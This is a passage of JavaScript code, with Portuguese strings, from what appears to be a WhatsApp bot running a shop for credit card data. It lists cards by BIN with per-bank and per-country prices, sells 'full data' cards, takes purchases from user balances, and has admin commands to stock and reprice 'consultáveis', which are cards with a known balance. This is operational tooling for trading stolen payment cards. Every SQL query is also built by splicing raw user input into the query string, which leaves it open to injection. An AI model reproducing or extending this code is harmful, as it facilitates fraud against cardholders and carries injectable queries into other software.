                SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
                SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

                Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CCS WHERE BIN = '${BIN}' AND TIPOCC = '1'`).all()
                if (Array_CCs.length === 0) {

                    Texto = `*NÃO TEMOS INFO CCs DESSA BIN.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                } else {

                    VALOR_BIN = await DataBase_Better.prepare(`SELECT
CCS.*,
CCS_PRECOS_BANDEIRA.VALOR AS VL_BANDEIRA,
CCS_PRECOS_NIVEL.VALOR AS VL_NIVEL,
CCS_PRECOS_BANCO.VALOR AS VL_BANCO,
CCS_PRECOS_PAIS.VALOR AS VL_PAIS,
CCS_PRECOS_BIN.VALOR AS VL_BIN,
(
CCS_PRECOS_BANDEIRA.VALOR + CCS_PRECOS_NIVEL.VALOR + CCS_PRECOS_BANCO.VALOR + CCS_PRECOS_PAIS.VALOR + CCS_PRECOS_BIN.VALOR
) AS VL_TOTAL
FROM
CCS
LEFT JOIN CCS_PRECOS_BANDEIRA ON (
CCS.BANDEIRA = CCS_PRECOS_BANDEIRA.BANDEIRA
)

LEFT JOIN CCS_PRECOS_NIVEL ON (
CCS.NIVEL = CCS_PRECOS_NIVEL.NIVEL
)

LEFT JOIN CCS_PRECOS_BANCO ON (
CCS.BANCO = CCS_PRECOS_BANCO.BANCO
)

LEFT JOIN CCS_PRECOS_PAIS ON (
CCS.PAIS = CCS_PRECOS_PAIS.PAIS
)

LEFT JOIN CCS_PRECOS_BIN ON (
CCS.BIN = CCS_PRECOS_BIN.BIN
)

WHERE CCS_PRECOS_BIN.BIN = '${BIN}' LIMIT 1`).all()
                    //console.log(`VALOR TOTAL DA BIN: R$:${VALOR_BIN[0]["VL_TOTAL"]}`)

                    CONSTRUCAO_LISTMESSAGE_buttonText = `INFO CC BIN ${BIN}`
                    CONSTRUCAO_LISTMESSAGE_title = `BINs ${BIN}`
                    CONSTRUCAO_LISTMESSAGE_description = `*${Nome_Bot}*

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${NUMERO_USER_CONTROLE_VISIBILIDADE}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

*BINs ${BIN}* ✅

⚠️ *ATENÇÃO! AO ESCOLHER A CC DESEJADA E CLICAR EM ENVIAR, A COMPRA SERÁ EFETUADA. ENTÃO ESCOLHA COM ATENÇÃO.*`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    // iD_Footer = Date.now() // TIREI DAQUI PORQUE JA TEM EM CIMA

                    for await (item of Array_CCs) {
                        Numero_CC = item["NUMERO"]
                        Digito = Numero_CC.match(/./igm)

                        CONSTRUCAO_LISTMESSAGE_rows.push({
                            rowId: `${iD_Footer.toString()}|comprarcc|1|${item["rowid"]}`,
                            title: `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}##########`,
                            description: `💰PREÇO: R$:${VALOR_BIN[0]["VL_TOTAL"]}
💠${item["NIVEL"]}
🏛${item["BANCO"]}
🏳️${item["BANDEIRA"]}
🌍${item["PAIS"]}`
                        })
                    }

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                }

                await delay(3000)

                FULLDADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FULLDADOS'`).get()["VALOR"]
                if (FULLDADOS === "1") {

                    Array_CCs_Full = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CCS WHERE BIN = '${BIN}' AND TIPOCC = '2'`).all()
                    if (Array_CCs_Full.length === 0) {

                        Texto_Full = `*NÃO TEMOS CCs FULL DADOS DESSA BIN.*`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Full}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    } else {

                        VALOR_BIN_FULL = await DataBase_Better.prepare(`SELECT
CCS.*,
CCS_PRECOS_BANDEIRA_FULL.VALOR AS VL_BANDEIRA,
CCS_PRECOS_NIVEL_FULL.VALOR AS VL_NIVEL,
CCS_PRECOS_BANCO_FULL.VALOR AS VL_BANCO,
CCS_PRECOS_PAIS_FULL.VALOR AS VL_PAIS,
CCS_PRECOS_BIN_FULL.VALOR AS VL_BIN,
(
CCS_PRECOS_BANDEIRA_FULL.VALOR + CCS_PRECOS_NIVEL_FULL.VALOR + CCS_PRECOS_BANCO_FULL.VALOR + CCS_PRECOS_PAIS_FULL.VALOR + CCS_PRECOS_BIN_FULL.VALOR
) AS VL_TOTAL
FROM
CCS
LEFT JOIN CCS_PRECOS_BANDEIRA_FULL ON (
CCS.BANDEIRA = CCS_PRECOS_BANDEIRA_FULL.BANDEIRA
)

LEFT JOIN CCS_PRECOS_NIVEL_FULL ON (
CCS.NIVEL = CCS_PRECOS_NIVEL_FULL.NIVEL
)

LEFT JOIN CCS_PRECOS_BANCO_FULL ON (
CCS.BANCO = CCS_PRECOS_BANCO_FULL.BANCO
)

LEFT JOIN CCS_PRECOS_PAIS_FULL ON (
CCS.PAIS = CCS_PRECOS_PAIS_FULL.PAIS
)

LEFT JOIN CCS_PRECOS_BIN_FULL ON (
CCS.BIN = CCS_PRECOS_BIN_FULL.BIN
)

WHERE CCS_PRECOS_BIN_FULL.BIN = '${BIN}' LIMIT 1`).all()
                        //console.log(`VALOR TOTAL DA BIN FULL: R$:${VALOR_BIN_FULL[0]["VL_TOTAL"]}`)

                        CONSTRUCAO_LISTMESSAGE_buttonText = `BIN ${BIN} FULL DADOS`
                        CONSTRUCAO_LISTMESSAGE_title = `BINs ${BIN} FULL DADOS`
                        CONSTRUCAO_LISTMESSAGE_description = `*${Nome_Bot}*

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${NUMERO_USER_CONTROLE_VISIBILIDADE}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

*BINs ${BIN} FULL DADOS* ✅

⚠️ *ATENÇÃO! AO ESCOLHER A CC FULL DADOS DESEJADA E CLICAR EM ENVIAR, A COMPRA SERÁ EFETUADA. ENTÃO ESCOLHA COM ATENÇÃO.*`

                        CONSTRUCAO_LISTMESSAGE_rows = []
                        // iD_Footer = Date.now() // TIREI DAQUI PORQUE JA TEM EM CIMA

                        for await (item_Full of Array_CCs_Full) {
                            Numero_CC_Full = item_Full["NUMERO"]
                            console.log(Numero_CC_Full)
                            Digito_Full = Numero_CC_Full.match(/./igm)

                            CONSTRUCAO_LISTMESSAGE_rows.push({
                                rowId: `${iD_Footer.toString()}|comprarcc|2|${item["rowid"]}`,
                                title: `${Digito_Full[0]}${Digito_Full[1]}${Digito_Full[2]}${Digito_Full[3]}${Digito_Full[4]}${Digito_Full[5]}##########`,
                                description: `💰PREÇO: R$:${VALOR_BIN_FULL[0]["VL_TOTAL"]}
💠${item_Full["NIVEL"]}
🏛${item_Full["BANCO"]}
🏳️${item_Full["BANDEIRA"]}
🌍${item_Full["PAIS"]}`
                            })
                        }

                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }
                } else {
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 



        ///add===BANCO===SALDO===PREÇO===INFORMACOES_ADICIONAIS
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addconsul===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO CONSULTÁVEIS..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        try {

                            Abastecendo = true

                            Div = Mensagem_Texto.split("===")

                            BANCO = Div[1].toUpperCase()
                            SALDO = Div[2]
                            console.log(`Inserindo consul do saldo: ${SALDO}`)
                            SALDO = parseFloat(SALDO).toFixed(2)
                            PRECO = Div[3]
                            PRECO = parseFloat(PRECO).toFixed(2)
                            INFORMACOES_ADICIONAIS = Div[4]
                            DATA_MS_INSERIDO = Date.now()

                            db.run(`INSERT INTO CONSULTAVEIS (BANCO,SALDO,PRECO,INFORMACOES_ADICIONAIS,DATA_MS_INSERIDO) VALUES ('${BANCO}','${SALDO}','${PRECO}','${INFORMACOES_ADICIONAIS}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                            Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1

                        } catch (error) {
                            console.log(error)

                            Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        Texto = `*ABASTECIMENTO FINALIZADO*

${Contagem_Abastecidas} Consultáveis Abastecidas.`
                        for await (adm of Adms) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorconsultavel===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                if (Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido CODE:1`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                msg = Mensagem_Texto.split("===")
                ID = msg[1]
                NOVO_VALOR = msg[2]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (ID === "") {
                    Texto = `Comando inválido CODE:2`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                if (NOVO_VALOR === "") {

                    Texto = `Comando inválido CODE:3`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                SALDO = await DataBase_Better.prepare(`SELECT SALDO FROM CONSULTAVEIS WHERE _rowid_ = '${ID}'`).get()["SALDO"]

                PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT PRECO FROM CONSULTAVEIS WHERE _rowid_ = '${ID}'`).get()["PRECO"]
                PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

                await DataBase_Better.prepare(`UPDATE CONSULTAVEIS SET PRECO = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

                Texto = `*Preço da Consultável que possui o Saldo: ${SALDO} do ID: ${ID} alterado com sucesso!*

*Valor anterior:* ${PRECO_ANTERIOR}

*Valor atual:* ${NOVO_VALOR}`
                for await (adm of Adms) {
